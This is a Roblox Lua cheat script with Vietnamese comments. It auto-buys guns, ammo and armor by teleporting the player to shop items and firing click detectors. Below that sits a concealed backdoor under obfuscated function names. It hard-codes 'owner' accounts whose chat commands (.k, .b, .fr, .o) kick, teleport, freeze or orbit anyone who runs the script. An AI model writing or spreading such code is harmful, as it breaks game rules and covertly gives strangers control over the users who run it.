-- Logic Auto Buy trong Heartbeat
RunService.Heartbeat:Connect(function()
    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
        pcall(function()
            local SavedPosition = lp.Character.HumanoidRootPart.CFrame
            
            -- Buy Single
            if BuyingSingle and not lp.Character:FindFirstChild(SelectedGun) and not lp.Backpack:FindFirstChild(SelectedGun) then
                local shopItem = workspace.Ignored.Shop:FindFirstChild(ShopTable[SelectedGun].ShopName)
                if shopItem and shopItem:FindFirstChild("Head") then
                    lp.Character.HumanoidRootPart.CFrame = shopItem.Head.CFrame
                    fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
                    RunService:BindToRenderStep("RestoreCFrame", 199, function()
                        lp.Character.HumanoidRootPart.CFrame = SavedPosition
                        RunService:UnbindFromRenderStep("RestoreCFrame")
                    end)
                end
                BuyingSingle = false
            end
            
            -- Buy Ammo
            if BuyingAmmo then
                local ammoName = SelectedGun:gsub("%[", "["):gsub("%]", " Ammo]")
                if ShopTable[ammoName] then
                    local shopItem = workspace.Ignored.Shop:FindFirstChild(ShopTable[ammoName].ShopName)
                    if shopItem and shopItem:FindFirstChild("Head") then
                        if lp.Character:FindFirstChild(SelectedGun) then
                            lp.Character:FindFirstChild(SelectedGun).Parent = lp.Backpack
                        end
                        lp.Character.HumanoidRootPart.CFrame = shopItem.Head.CFrame
                        fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
                        RunService:BindToRenderStep("RestoreCFrame", 199, function()
                            lp.Character.HumanoidRootPart.CFrame = SavedPosition
                            RunService:UnbindFromRenderStep("RestoreCFrame")
                        end)
                    end
                end
            end
            
            -- Auto Loadout
            if AutoLoadoutEnabled and not lp.Character:FindFirstChild(AutoLoadoutGun) and not lp.Backpack:FindFirstChild(AutoLoadoutGun) then
                local shopItem = workspace.Ignored.Shop:FindFirstChild(ShopTable[AutoLoadoutGun].ShopName)
                if shopItem and shopItem:FindFirstChild("Head") then
                    lp.Character.HumanoidRootPart.CFrame = shopItem.Head.CFrame
                    fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
                    RunService:BindToRenderStep("RestoreCFrame", 199, function()
                        lp.Character.HumanoidRootPart.CFrame = SavedPosition
                        RunService:UnbindFromRenderStep("RestoreCFrame")
                    end)
                end
            end
            
            -- Auto Armor
            if AutoArmorEnabled and lp.Character.BodyEffects and lp.Character.BodyEffects.Armor.Value < 100 then
                local armorItem = workspace.Ignored.Shop:FindFirstChild("[High-Medium Armor] - $2513")
                if armorItem and armorItem:FindFirstChild("Head") then
                    lp.Character.HumanoidRootPart.CFrame = armorItem.Head.CFrame
                    fireclickdetector(armorItem:FindFirstChildOfClass("ClickDetector"))
                    RunService:BindToRenderStep("RestoreCFrame", 199, function()
                        lp.Character.HumanoidRootPart.CFrame = SavedPosition
                        RunService:UnbindFromRenderStep("RestoreCFrame")
                    end)
                end
            end
        end)
    end
end)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlayer = Players.LocalPlayer

-- Danh sách owner
local owners = {
    "GameLuaNhau",
    "quayvebenanhdi",
    "3"
}

-- Biến điều khiển
local isFrozen = false
local isOrbiting = false
local orbitConnection = nil
local orbitDistance = 5

-- Teleport tới owner
function x1y2z3(owner)
    if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
        localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
    end
end

-- Bắt đầu orbit quanh owner
local function startOrbit(owner)
    if isOrbiting or not owner then return end
    isOrbiting = true

    orbitConnection = RunService.RenderStepped:Connect(function()
        local char = localPlayer.Character
        local oChar = owner.Character
        if char and oChar and oChar:FindFirstChild("HumanoidRootPart") then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            local ohrp = oChar.HumanoidRootPart

            if hrp then
                local t = tick() * 2
                local offset = Vector3.new(math.cos(t) * orbitDistance, 0, math.sin(t) * orbitDistance)
                hrp.CFrame = CFrame.new(ohrp.Position + offset, ohrp.Position)
            end
        end
    end)
end

-- Dừng orbit
local function stopOrbit()
    isOrbiting = false
    if orbitConnection then
        orbitConnection:Disconnect()
        orbitConnection = nil
    end
end

-- Freeze
local function freezePlayer()
    isFrozen = true
    local char = localPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.Anchored = true
    end
end

-- Unfreeze
local function unfreezePlayer()
    isFrozen = false
    local char = localPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.Anchored = false
    end
end

-- Kết nối với owner
function a1b2c3(ownerName)
    local owner

    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == ownerName then
            owner = player
            break
        end
    end

    if owner then
        owner.Chatted:Connect(function(message)
            -- Kick
            if message == ".k" then
                localPlayer:Kick("Owner Has Kicked You.")

            -- Bring
            elseif message == ".b" then
                x1y2z3(owner)

            -- Freeze
            elseif message == ".fr" then
                freezePlayer()

            -- Unfreeze
            elseif message == ".unfr" then
                unfreezePlayer()

            -- Orbit người dùng không phải owner
            elseif message == ".o" then
                if not table.find(owners, localPlayer.Name) then
                    startOrbit(owner)
                end

            -- Dừng orbit
            elseif message == ".uno" then
                stopOrbit()
            end
        end)
    end
end

-- Đăng ký cho tất cả owner
for _, ownerName in ipairs(owners) do
    a1b2c3(ownerName)
end
